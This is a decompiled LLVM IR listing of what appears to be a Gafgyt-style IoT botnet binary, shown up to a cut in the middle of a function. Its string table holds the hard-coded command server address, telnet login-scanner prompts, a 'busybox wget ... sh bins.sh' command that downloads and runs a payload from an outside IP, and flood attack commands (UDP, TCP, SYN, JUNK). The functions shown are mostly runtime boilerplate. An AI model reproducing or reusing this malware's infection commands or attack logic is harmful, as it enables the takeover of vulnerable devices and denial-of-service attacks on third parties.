source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }

@cf = internal unnamed_addr global i1 false
@of = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_80555ec.2 = global i32 0
@global_var_8055604.3 = local_unnamed_addr global i32* @global_var_80555ec.2
@global_var_80545dc.4 = constant i32 0
@global_var_80558e4.5 = global i32 0
@global_var_80555f0.6 = local_unnamed_addr global i32 0
@global_var_80529dd.7 = constant [7 x i8] c"x86_32\00"
@global_var_8052a1a.12 = constant [8 x i8] c"UNKNOWN\00"
@global_var_8055920.13 = global i32 0
@global_var_8055924.14 = local_unnamed_addr global i32 0
@global_var_8055928.15 = local_unnamed_addr global i32 0
@global_var_805567c.16 = local_unnamed_addr global i32 4095
@global_var_8055678.17 = local_unnamed_addr global i32 362436
@global_var_8052a22.18 = constant [7 x i8] c"(null)\00"
@global_var_8052a29.20 = constant [3 x i8] c"-c\00"
@global_var_8052a2c.21 = constant [3 x i8] c"sh\00"
@global_var_8052a2f.22 = constant [8 x i8] c"/bin/sh\00"
@global_var_8052a40.23 = constant i32 -1
@global_var_8052e40.24 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_8052e4e.25 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_8052e57.27 = constant [5 x i8] c"PING\00"
@global_var_8055908.28 = local_unnamed_addr global i32 0
@global_var_805590c.29 = local_unnamed_addr global i32 0
@global_var_805b988.30 = local_unnamed_addr global i32 0
@global_var_8052e5c.31 = constant [6 x i8] c":>%$#\00"
@global_var_8052e63.32 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_805b980.33 = local_unnamed_addr global i32 0
@global_var_8052e6f.34 = constant [6 x i8] c"ogin:\00"
@global_var_8052e75.35 = constant [3 x i8] c"\0D\0A\00"
@global_var_8052e78.36 = constant [9 x i8] c"assword:\00"
@global_var_8052e81.37 = constant [9 x i8] c"ncorrect\00"
@global_var_80528c2.38 = constant [14 x i8] c"sh || shell\0D\0A\00"
@global_var_80528d0.39 = constant [79 x i8] c"cd /var/ || cd /tmp/ || cd /var/run( || cd /var/tmp/ || cd /dev/ || cd /mnt/\0D\0A\00"
@global_var_8052920.40 = constant [125 x i8] c"busybox wget || wget 185.158.113.30/bins.sh; busybox tftp || tftp -g -r 185.158.113.30 bins.sh; sh bins.sh || bash bins.sh\0D\0A\00"
@global_var_80529a0.41 = constant [61 x i8] c"busybox echo || echo nameserver 8.8.8.8 > /etc/resolv.conf\0D\0A\00"
@global_var_8055668.42 = local_unnamed_addr global [4 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80528c2.38, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_80528d0.39, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_8052920.40, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_80529a0.41, i32 0, i32 0)]
@global_var_8055674.43 = local_unnamed_addr global [61 x i8]* @global_var_80529a0.41
@global_var_805566c.44 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_80528d0.39, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_8052920.40, i32 0, i32 0)]
@global_var_8055670.45 = local_unnamed_addr global [125 x i8]* @global_var_8052920.40
@global_var_8052eb0.46 = constant [4 x i8] c"all\00"
@global_var_8052eb4.47 = constant i32 2037579820
@global_var_8052eb6.48 = constant [4 x i8] c"syn\00"
@global_var_8052eba.49 = constant [4 x i8] c"rst\00"
@global_var_8052ebe.50 = constant [4 x i8] c"fin\00"
@global_var_8052ec2.51 = constant [4 x i8] c"ack\00"
@global_var_8052ec6.52 = constant [4 x i8] c"psh\00"
@global_var_8052eca.53 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_8052edc.54 = constant [6 x i8] c"PONG!\00"
@global_var_8052ee2.55 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_8052eed.56 = constant [10 x i8] c"My IP: %s\00"
@global_var_8052ef7.57 = constant [5 x i8] c"HOLD\00"
@global_var_8052efc.58 = constant [5 x i8] c"JUNK\00"
@global_var_8052f01.59 = constant [4 x i8] c"UDP\00"
@global_var_8052f05.60 = constant [4 x i8] c"TCP\00"
@global_var_8052f09.61 = constant [9 x i8] c"KILLATTK\00"
@global_var_8052f12.62 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_8055624.63 = local_unnamed_addr global i32 -1
@global_var_8052860.64 = constant [19 x i8] c"185.158.113.30:954\00"
@global_var_8055620.65 = global [19 x i8]* @global_var_8052860.64
@global_var_8052f1c.66 = constant [8 x i8] c"8.8.8.8\00"
@global_var_8052f24.67 = constant [16 x i8] c"/proc/net/route\00"
@global_var_8052f34.68 = constant [11 x i8] c"\0900000000\09\00"
@global_var_8052f3f.70 = constant [6 x i8] c"-bash\00"
@global_var_8052f4b.72 = constant i32 859003675
@global_var_8052f54.73 = constant [46 x i8] c"%sWelcome to the botnet [%s:%s:%d cores] :)%s\00"
@global_var_8052f82.74 = constant i32 1931804719
@global_var_8052f84.75 = constant [38 x i8] c"%sCould not connect to commServer!%s\0A\00"
@global_var_8052faa.76 = constant [17 x i8] c"BUILD [%s:%s:%d]\00"
@global_var_8052fbb.77 = constant [8 x i8] c"SCANNER\00"
@global_var_8052fc3.78 = constant [17 x i8] c"SCANNER ON | OFF\00"
@global_var_8052fd4.79 = constant [4 x i8] c"OFF\00"
@global_var_805b984.80 = local_unnamed_addr global i32 0
@global_var_8052fd8.81 = constant [17 x i8] c"SCANNER STOPPED!\00"
@global_var_8052fe9.82 = constant [3 x i8] c"ON\00"
@global_var_8052fec.83 = constant [28 x i8] c"attempting to start scanner\00"
@global_var_8053008.84 = constant [17 x i8] c"SCANNER STARTED!\00"
@global_var_8053019.85 = constant [5 x i8] c"PONG\00"
@global_var_805301e.86 = constant [4 x i8] c"DUP\00"
@global_var_8053022.87 = constant [3 x i8] c"SH\00"
@global_var_8053025.88 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant i32 1931804786
@global_var_805302f.90 = constant [3 x i8] c"%s\00"
@global_var_8053032.91 = constant i32 32
@global_var_8055684 = external local_unnamed_addr global i32
@global_var_805b974.97 = global i32 0
@global_var_8053640.98 = constant i32 0
@global_var_80556a8.99 = global i32 0
@global_var_80556c0.100 = global i32 0
@global_var_80556a4.101 = local_unnamed_addr global i32* bitcast (i16* @global_var_80556e0.94 to i32*)
@global_var_8053658.102 = constant [6 x i8] c"(nil)\00"
@global_var_805365e.103 = constant [7 x i8] c"(null)\00"
@global_var_8053665.104 = constant i32 2949163
@global_var_80536d2.106 = constant i32 327688
@global_var_80536ca.107 = constant [8 x i8] c" +0-#'I\00"
@global_var_8053678.108 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_80536b5.109 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_80536ab.110 = constant i32 117506048
@global_var_805369c.111 = constant i32 331776
@global_var_8053720.112 = constant [8 x i8] c"Success\00"
@global_var_80536f6.113 = constant [15 x i8] c"Unknown error \00"
@global_var_805b940.114 = global i32 0
@global_var_805b944.115 = global i32 0
@global_var_805b9a0.116 = global i32 0
@global_var_80557d0.117 = global i32 0
@global_var_805ba4c.119 = global i32 0
@global_var_805ba50.120 = local_unnamed_addr global i32 0
@global_var_805ba54.121 = global i32 0
@global_var_805ba60.122 = local_unnamed_addr global i32 0
@global_var_805bd54.123 = global i32 0
@global_var_805bd7c.124 = local_unnamed_addr global i32 0
@global_var_805bd6c.125 = local_unnamed_addr global i32 0
@global_var_805bd70.126 = local_unnamed_addr global i32 0
@global_var_805bd74.127 = local_unnamed_addr global i32 0
@global_var_805bd90.128 = local_unnamed_addr global i32 0
@global_var_805bd78.129 = local_unnamed_addr global i32 0
@global_var_805bd84.130 = local_unnamed_addr global i32 0
@global_var_805bd88.131 = local_unnamed_addr global i32 0
@global_var_805bd94.132 = local_unnamed_addr global i32 0
@global_var_805bd68.133 = local_unnamed_addr global i32 0
@global_var_805bd64.135 = local_unnamed_addr global i32 0
@global_var_805bd8c.136 = local_unnamed_addr global i32 0
@global_var_805ba5c.137 = local_unnamed_addr global i32 0
@global_var_80557e8.138 = global i32 0
@global_var_8055800.140 = global i32 0
@global_var_8055818 = external global i32
@global_var_8055844.142 = global i32 -1726662223
@global_var_8055820.143 = local_unnamed_addr global i32* @global_var_8055844.142
@global_var_805581c.144 = global i32* @global_var_8055844.142
@global_var_8054294.145 = constant i32 0
@global_var_8054280.146 = constant i32 0
@global_var_80558c0.147 = global i32 0
@global_var_805b958.148 = local_unnamed_addr global i32 0
@global_var_805b960.149 = local_unnamed_addr global i32 0
@global_var_80555e0.151 = global i32 -1
@global_var_80512bb.152 = constant i32 -294069
@global_var_805b968.153 = local_unnamed_addr global i32 0
@global_var_805b96c.154 = local_unnamed_addr global i32 0
@global_var_8054500.155 = constant [10 x i8] c"/dev/null\00"
@global_var_805b964.157 = local_unnamed_addr global i32 0
@global_var_805b95c.158 = local_unnamed_addr global i32 0
@global_var_805365d.159 = constant i32 1970153472
@global_var_80558d8.160 = local_unnamed_addr global i32* @global_var_805365d.159
@global_var_80514a3.161 = constant i32 1928542531
@global_var_80514c7.162 = constant i32 1928542531
@global_var_805b97c.163 = local_unnamed_addr global i32 0
@global_var_805451c.165 = constant [4 x i8] c"inf\00"
@global_var_805451f.170 = constant i32 1179535616
@global_var_805452c.171 = constant i32 2883630
@global_var_805bd98.172 = local_unnamed_addr global i32 0
@global_var_805bd9c.173 = local_unnamed_addr global i32 0
@global_var_80558e0.1 = local_unnamed_addr global i8 0
@global_var_8059920.19 = external local_unnamed_addr global i8*
@global_var_8055900.26 = external local_unnamed_addr global i8*
@global_var_8055910.69 = external global i8*
@2 = internal constant [6 x i8] c"\1B[0m\0A\00"
@global_var_8052f45.71 = constant i8* getelementptr inbounds ([6 x i8], [6 x i8]* @2, i32 0, i32 0)
@global_var_80556e0.94 = global i16 288
@global_var_8055730.95 = local_unnamed_addr global i16 272
@global_var_80536ea.105 = external constant i8*
@global_var_805ba20.118 = global i8 0
@global_var_805bd80.134 = local_unnamed_addr global i8 0
@global_var_805b954.139 = local_unnamed_addr global i8 0
@global_var_805b970.156 = local_unnamed_addr global i8 0
@global_var_8054540.168 = constant x86_fp80* null
@global_var_805302d.89 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 54615
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_80558e0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048102_crit_edge

entry.dec_label_pc_8048102_crit_edge:             ; preds = %entry
  %v0_8048103.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048102

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_8055604.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_8055604.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_8055604.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_80558e0.1, align 32
  br label %dec_label_pc_8048102

dec_label_pc_8048102:                             ; preds = %entry.dec_label_pc_8048102_crit_edge, %dec_label_pc_80480e6
  %v0_8048103 = phi i32 [ %v0_8048103.pre, %entry.dec_label_pc_8048102_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048103

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8055604.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_80558e0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048102, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_804814a, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048145 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_80545dc.4 to i32))
  br label %dec_label_pc_804814a

dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_80555f0.6, align 16
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @__uClibc_main(i32 134535008, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134555716, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @getProperBinary() local_unnamed_addr {
entry:
  %v0_8048190 = load i32, i32* @eax, align 4
  ret i32 %v0_8048190
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_80529dd.7 to i32)
}

define i32 @getCoresAmount() local_unnamed_addr {
entry:
  %v0_804819b = load i32, i32* @ebp, align 4
  %v1_80481a8 = call i32 @sysconf(i32 84)
  store i32 %v0_804819b, i32* @ebp, align 4
  ret i32 %v1_80481a8
}

define i32 @getEndianness() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([8 x i8]* @global_var_8052a1a.12 to i32)
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_8055920.13, align 32
  %v1_804823d = add i32 %arg1, -1640531527
  store i32 %v1_804823d, i32* @global_var_8055924.14, align 4
  %v1_804824a = add i32 %arg1, 1013904242
  store i32 %v1_804824a, i32* %eax.global-to-local, align 4
  store i32 %v1_804824a, i32* @global_var_8055928.15, align 8
  br label %dec_label_pc_804825d

dec_label_pc_804825d:                             ; preds = %entry, %dec_label_pc_804825d
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_804828d, %dec_label_pc_804825d ]
  %v1_8048263 = add nsw i32 %storemerge5, -3
  store i32 %v1_8048263, i32* %eax.global-to-local, align 4
  %v1_8048266 = mul nuw nsw i32 %v1_8048263, 4
  %v2_8048266 = add i32 %v1_8048266, ptrtoint (i32* @global_var_8055920.13 to i32)
  %v3_8048266 = inttoptr i32 %v2_8048266 to i32*
  %v4_8048266 = load i32, i32* %v3_8048266, align 4
  %v1_8048270 = add nsw i32 %storemerge5, -2
  store i32 %v1_8048270, i32* %eax.global-to-local, align 4
  %v1_8048273 = mul nuw nsw i32 %v1_8048270, 4
  %v2_8048273 = add i32 %v1_8048273, ptrtoint (i32* @global_var_8055920.13 to i32)
  %v3_8048273 = inttoptr i32 %v2_8048273 to i32*
  %v4_8048273 = load i32, i32* %v3_8048273, align 4
  %v2_804827a = xor i32 %v4_8048273, %v4_8048266
  %v2_804827f = xor i32 %storemerge5, -1640531527
  %v1_8048281 = xor i32 %v2_804827f, %v2_804827a
  store i32 %v1_8048281, i32* %eax.global-to-local, align 4
  %v2_8048286 = mul nuw nsw i32 %storemerge5, 4
  %v3_8048286 = add i32 %v2_8048286, ptrtoint (i32* @global_var_8055920.13 to i32)
  %v4_8048286 = inttoptr i32 %v3_8048286 to i32*
  store i32 %v1_8048281, i32* %v4_8048286, align 4
  %v4_804828d = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_804828d, 4096
  br i1 %exitcond, label %dec_label_pc_8048299, label %dec_label_pc_804825d

dec_label_pc_8048299:                             ; preds = %dec_label_pc_804825d
  %v0_804829a = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804829a

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804825d, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80482b7 = load i32, i32* @global_var_805567c.16, align 4
  %v1_80482bc = add i32 %v0_80482b7, 1
  %v1_80482bd = urem i32 %v1_80482bc, 4096
  store i32 %v1_80482bd, i32* @global_var_805567c.16, align 4
  %v1_80482cc = mul nuw nsw i32 %v1_80482bd, 4
  %v2_80482cc = add i32 %v1_80482cc, ptrtoint (i32* @global_var_8055920.13 to i32)
  %v3_80482cc = inttoptr i32 %v2_80482cc to i32*
  %v4_80482cc = load i32, i32* %v3_80482cc, align 4
  %v7_80482e9 = udiv i32 %v4_80482cc, 228675
  store i32 %v7_80482e9, i32* @global_var_8055678.17, align 8
  br i1 true, label %dec_label_pc_8048339, label %dec_label_pc_804832b

dec_label_pc_804832b:                             ; preds = %entry
  br label %dec_label_pc_8048339

dec_label_pc_8048339:                             ; preds = %entry, %dec_label_pc_804832b
  %v1_804834e = mul nuw nsw i32 %v1_80482bd, 4
  %v2_804834e = add i32 %v1_804834e, ptrtoint (i32* @global_var_8055920.13 to i32)
  %v3_804834e = inttoptr i32 %v2_804834e to i32*
  %v4_804834e = load i32, i32* %v3_804834e, align 4
  ret i32 %v4_804834e

; uselistorder directives
  uselistorder i32 %v1_80482bd, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8048339, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804835e = load i32, i32* @edi, align 4
  store i32 %v0_804835e, i32* %stack_var_-8, align 4
  %v4_8048369 = ptrtoint i8* %arg1 to i32
  %v3_804837a = call i32 @_strlen(i8* %arg1)
  %v1_8048381 = add i32 %v3_804837a, -1
  br label %dec_label_pc_804838a

dec_label_pc_8048387:                             ; preds = %dec_label_pc_804838a
  %v4_8048387 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804838a

dec_label_pc_804838a:                             ; preds = %entry, %dec_label_pc_8048387
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_8048387, %dec_label_pc_8048387 ]
  %v6_804838d = add i32 %stack_var_-16.0, %v4_8048369
  %v1_8048390 = inttoptr i32 %v6_804838d to i8*
  %v2_8048390 = load i8, i8* %v1_8048390, align 1
  %v2_8048393 = sext i8 %v2_8048390 to i32
  %v1_8048399 = call i32 @isspace(i32 %v2_8048393)
  %v1_804839e = icmp eq i32 %v1_8048399, 0
  %v1_80483a0 = icmp eq i1 %v1_804839e, false
  br i1 %v1_80483a0, label %dec_label_pc_8048387, label %dec_label_pc_80483a7.preheader

dec_label_pc_80483a7.preheader:                   ; preds = %dec_label_pc_804838a
  %v5_80483ad19 = icmp slt i32 %v1_8048381, %stack_var_-16.0
  br i1 %v5_80483ad19, label %dec_label_pc_80483c7, label %dec_label_pc_80483af

dec_label_pc_80483a4:                             ; preds = %dec_label_pc_80483af
  %v4_80483a4 = add i32 %stack_var_-12.020, -1
  %v5_80483ad = icmp slt i32 %v4_80483a4, %stack_var_-16.0
  br i1 %v5_80483ad, label %dec_label_pc_80483c7, label %dec_label_pc_80483af

dec_label_pc_80483af:                             ; preds = %dec_label_pc_80483a7.preheader, %dec_label_pc_80483a4
  %stack_var_-12.020 = phi i32 [ %v4_80483a4, %dec_label_pc_80483a4 ], [ %v1_8048381, %dec_label_pc_80483a7.preheader ]
  %v6_80483b2 = add i32 %stack_var_-12.020, %v4_8048369
  %v1_80483b5 = inttoptr i32 %v6_80483b2 to i8*
  %v2_80483b5 = load i8, i8* %v1_80483b5, align 1
  %v2_80483b8 = sext i8 %v2_80483b5 to i32
  %v1_80483be = call i32 @isspace(i32 %v2_80483b8)
  %v1_80483c3 = icmp eq i32 %v1_80483be, 0
  %v1_80483c5 = icmp eq i1 %v1_80483c3, false
  br i1 %v1_80483c5, label %dec_label_pc_80483a4, label %dec_label_pc_80483c7

dec_label_pc_80483c7:                             ; preds = %dec_label_pc_80483a4, %dec_label_pc_80483af, %dec_label_pc_80483a7.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %v1_8048381, %dec_label_pc_80483a7.preheader ], [ %stack_var_-12.020, %dec_label_pc_80483af ], [ %v4_80483a4, %dec_label_pc_80483a4 ]
  br label %dec_label_pc_80483ea

dec_label_pc_80483cf:                             ; preds = %dec_label_pc_80483ea
  %v6_80483df = add i32 %storemerge, %v4_8048369
  %v1_80483e2 = inttoptr i32 %v6_80483df to i8*
  %v2_80483e2 = load i8, i8* %v1_80483e2, align 1
  %v3_80483e5 = inttoptr i32 %v6_80483fa to i8*
  store i8 %v2_80483e2, i8* %v3_80483e5, align 1
  %v4_80483e7 = add i32 %storemerge, 1
  br label %dec_label_pc_80483ea

dec_label_pc_80483ea:                             ; preds = %dec_label_pc_80483c7, %dec_label_pc_80483cf
  %storemerge = phi i32 [ %v4_80483e7, %dec_label_pc_80483cf ], [ %stack_var_-16.0, %dec_label_pc_80483c7 ]
  %v7_80483f0 = icmp sgt i32 %storemerge, %stack_var_-12.0.lcssa
  store i32 %stack_var_-16.0, i32* @edx, align 4
  %v2_80483f8 = sub i32 %storemerge, %stack_var_-16.0
  %v6_80483fa = add i32 %v2_80483f8, %v4_8048369
  br i1 %v7_80483f0, label %dec_label_pc_80483f2, label %dec_label_pc_80483cf

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483ea
  %v22_80483fa = inttoptr i32 %v6_80483fa to i8*
  store i8 0, i8* %v22_80483fa, align 1
  %v0_8048400 = load i32, i32* @esp, align 4
  %v5_8048400 = icmp ugt i32 %v0_8048400, -37
  store i1 %v5_8048400, i1* @cf, align 1
  %v2_8048403 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048403, i32* @edi, align 4
  ret i32 %v6_80483fa

; uselistorder directives
  uselistorder i32 %storemerge, { 2, 3, 0, 1 }
  uselistorder i32 %stack_var_-12.020, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v1_8048381, { 2, 1, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80483ea, { 1, 0 }
  uselistorder label %dec_label_pc_80483c7, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80483af, { 1, 0 }
  uselistorder label %dec_label_pc_804838a, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_804840c = icmp eq i32* %arg1, null
  br i1 %v4_804840c, label %dec_label_pc_804842b, label %dec_label_pc_8048412

dec_label_pc_8048412:                             ; preds = %entry
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_8048415 = load i32, i32* %arg1, align 4
  %v3_804841a = inttoptr i32 %v2_8048415 to i8*
  store i8 %tmp8, i8* %v3_804841a, align 1
  %v2_804841f = load i32, i32* %arg1, align 4
  %v1_8048421 = add i32 %v2_804841f, 1
  store i32 %v1_8048421, i32* @edx, align 4
  store i32 %v1_8048421, i32* %arg1, align 4
  br label %dec_label_pc_8048446

dec_label_pc_804842b:                             ; preds = %entry
  %v3_8048441 = bitcast i8* %stack_var_8 to i32*
  %v4_8048441 = call i32 @__libc_write(i32 1, i32* %v3_8048441, i32 1)
  br label %dec_label_pc_8048446

dec_label_pc_8048446:                             ; preds = %dec_label_pc_8048412, %dec_label_pc_804842b
  %v0_8048447 = phi i32 [ %tmp5, %dec_label_pc_8048412 ], [ %v4_8048441, %dec_label_pc_804842b ]
  ret i32 %v0_8048447

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048446, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp13 = icmp slt i32 %arg3, 1
  br i1 %tmp13, label %dec_label_pc_80484a9, label %dec_label_pc_8048462

dec_label_pc_8048462:                             ; preds = %entry
  %v4_8048469 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8048469, i32* @edx, align 4
  %v2_804847a45 = load i8, i8* %arg2, align 1
  %v4_804847d47 = icmp eq i8 %v2_804847a45, 0
  %v1_804847f49 = icmp eq i1 %v4_804847d47, false
  br i1 %v1_804847f49, label %dec_label_pc_8048471, label %dec_label_pc_8048481

dec_label_pc_8048471:                             ; preds = %dec_label_pc_8048462, %dec_label_pc_8048471
  %v4_804847751 = phi i32 [ %v5_8048474, %dec_label_pc_8048471 ], [ %v4_8048469, %dec_label_pc_8048462 ]
  %stack_var_-12.050 = phi i32 [ %v4_8048471, %dec_label_pc_8048471 ], [ 0, %dec_label_pc_8048462 ]
  %v4_8048471 = add i32 %stack_var_-12.050, 1
  %v5_8048474 = add i32 %v4_804847751, 1
  %v22_8048474 = inttoptr i32 %v5_8048474 to i8*
  store i32 %v5_8048474, i32* @edx, align 4
  %v2_804847a = load i8, i8* %v22_8048474, align 1
  %v4_804847d = icmp eq i8 %v2_804847a, 0
  %v1_804847f = icmp eq i1 %v4_804847d, false
  br i1 %v1_804847f, label %dec_label_pc_8048471, label %dec_label_pc_8048481

dec_label_pc_8048481:                             ; preds = %dec_label_pc_8048471, %dec_label_pc_8048462
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_8048462 ], [ %v4_8048471, %dec_label_pc_8048471 ]
  %v5_8048487 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_8048487, label %dec_label_pc_8048492, label %dec_label_pc_8048498

dec_label_pc_8048492:                             ; preds = %dec_label_pc_8048481
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_8048495 = sub i32 %arg3, %stack_var_-12.0.lcssa
